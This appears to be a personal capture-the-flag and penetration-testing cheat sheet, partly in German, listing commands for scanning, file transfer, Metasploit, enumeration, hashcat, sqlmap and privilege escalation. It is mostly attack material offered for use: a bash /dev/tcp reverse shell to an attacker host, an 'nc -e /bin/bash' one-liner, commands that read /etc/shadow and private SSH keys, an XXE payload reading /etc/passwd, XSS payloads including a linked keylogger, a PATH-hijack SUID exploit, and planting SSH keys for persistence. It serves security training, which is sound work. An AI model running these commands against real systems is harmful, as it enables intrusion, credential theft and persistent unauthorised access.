# docs-ctf-cheatsheet
### NMAP:
```shell nmap -sC -sV -oA nmap/initial IPADRESS``` (standart)

```shell nmap -p- -T5 -sC -sV -oA nmap/second IPADRESS``` (quick scan of all ports)

-A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one

-p- : Enables scanning across all ports, not just the top 1000

-sC : Scan with default NSE scripts. Considered useful for discovery and safe

-sV : Attempts to determine the version of the service running on port

-oA [dir] all output to [dir]

### NETCAT:
send data:

reciever:
```shell
nc -l -p 1234 > FILE.NAME
```
(sometimes netcat instead of nc!)

sender:
```shell
nc -w 3 DESTINATION 1234 < FILE.NAME
```

### MSF:
search:
```shell
search [SEARCHTERM]
```
send data:
```shell
upload /path/to/file
```
run exploit in background and enter the session:
```shell
run -j
```
sessions:
```shell
sessions -i [session id]
```
get "normal" shell:
```shell
shell
```
move out of a session:
```shell
ctrl+z
```

### HTTPSERVER:
send data:

sender:
```shell
python -m SimpleHTTPServer 8083
```
reciever:
```shell
curl IPADRESSSENDER:8083/FILE.NAME
curl 10.10.14.145:8083/47502.py > hmm.py
```
OR
```shell
wget IPADRESSSENDER:8083/FILE.NAME
```

### REVERSE SHELL:
1. setup listener on my machine:
nc -lvnp 8081
2. go to
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
and try them out on target machine
easiest rs : ;nc -e /bin/bash

### INTERACTIVE SHELL:
target:
	export RHOST=<IPADRESSATTACKER>
attacker:
	nc -lp 14445
target:
	bash -c 'bash -i &>/dev/tcp/$RHOST/14445 0<&1'
attacker (now on targetshell):
	python -c 'import pty; pty.spawn("/bin/bash")'
	OR
	python3 -c 'import pty; pty.spawn("/bin/bash")'

### COMMAND INJECTION
Linux
whoami
id
ifconfig/ip addr
uname -a
ps -ef
cat /etc/passwd
cat /etc/shadow
cat /home/USERNAME/.ssh/id_rsa
Windows
whoami
ver
ipconfig
tasklist
netstat -an

### CHECK IF SOMETHING IS EXECUTED
attacker:
	sudo tcpdump ip proto \\icmp -i tun0
target:
	ping [local tun0 ip] -c 1

### BROKEN AUTHENTICATION:
password guessing/bruteforce
weak session cookies
reregistration of existing user “ admin” (with space) and gain all rights of “admin”
1. try register as randomname
2. if “randomname has already been taken” try register with “ randomname” and see what happens

### XML EXTERNAL ENTITY (XXE):
try :
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
and:
<!DOCTYPE replace [<!ENTITY name "success"> ]>
 <userInfo>
  <firstName>xxe</firstName>
  <lastName>&name;</lastName>
 </userInfo>

### XSS PAYLOADS:
Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner
test <img src=x onerror=alert(2)>


### POST EXPLOITATION WINDOWS:

Get-WmiObject -Class win32_OperatingSystem (Power Shell)
run post/windows/gather/checkvm (Metasploit) - check if vm
run post/multi/recon/local_exploit_suggester (Metasploit)
run post/windows/manage/enable_rdp (Metasploit)
ipconfig
try migrate spoolsv.exe
getuid
sysinfo
getprivs
run autoroute -s [SUBNET IP] -n 255.255.255.0



### Enummeration Scripts:
#### Local:
* LinEnum
* LinPEAS
* WinPEAS
#### Remote:
enum4linux [OPTIONS] [IP] - works for windows and linux SMB SAMBA


### SMBClient:
smbclient //[IP]/[DIRECTORY] -U [USERNAME]

### NFS:
sudo mount -t nfs [IP]:[tragetdirectory] /tmp/mount/ -nolock

### SUID:
find SUID : find / -perm -u=s -type f 2>/dev/null

Exploit /usr/bin/menu with SUID :
	cd /tmp
	echo /bin/sh > curl
	chmod 777 curl
	export PATH=/tmp:$PATH
	/usr/bin/menu


### DNS PROBLEM (for Hack The Box)
sudo nano /etc/hosts
add [IPADRESS] [DOMAIN], save and it should work!

### SSH:
ssh-keygen -f [NAME]
	now i can write the [NAME].pub file content (exept for the last part with my USER@IP
and add “ssh-rsa “ before the key if not there) to the
/home/[USER]/.ssh/authorized_keys/
then ssh -i [NAME] [USER]@[IP]

### PYTHON VIRTUAL ENVIRONMENT
	env init:
		python3 -m venv [NAME UMGEBUNG]
	env laden:
		source [NAME UMGEBUNG]/bin/activate
	packet installieren (in env):
		pip3 install [PACKET NAME]
	env exit:
		deactivate
	pip zeigt installierte packets:
		pip3 freeze

### JAVA-VERSION ARCH LINUX
some programs run only with a certain jre, so you can use the following to set the default jre on your system:
sudo archlinux-java set java-8-openjdk/jre

### TMUX:
	neue tmux session in gewünschter directory starten:
		tmux new -s [NAME]
	new  panel
CMD+B, c
rename panel
	CMD+B, ,
split panel vertical
	CMD+B, %
split panel horizontal
	CMD+B, “
navigate between panel
	CMD+B, pfeiltasten
resize panel
	CMD+B + pfeiltasten

### GOBUSTER
./gobuster dir -u http://ADRESS/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
maybe mit +x php

### MYSQL
mysql -u [USER] -p'[PASSWORD]'

### HASHCAT (Windows)
.\hashcat.exe -a [ATTACKTYPE] -m [HASHTYPE] [PATHTOHASHES] [PATHTODICTIONARY] -r [PATHTORULE]
ATTACKTYPE : 0 for dictionary/dictionary-rule attack
HASHTYPE : tunnelsup.com/hash-analyzer/, hashcat.net/wiki/doku.php?id=example_hashes
PATHTORULE : \rules\best64.rule is good

### SQLMAP
```shell
sqlmap -r [FULLFILEPATHTOREQUEST] -dump
```
--dbs : dump database names
-D [DB] : choose Target Database
-T [TABLE] : choose Target Table
-dump : dump target table
 --dbms=[DBTYPE] : choose DBType (mysql)
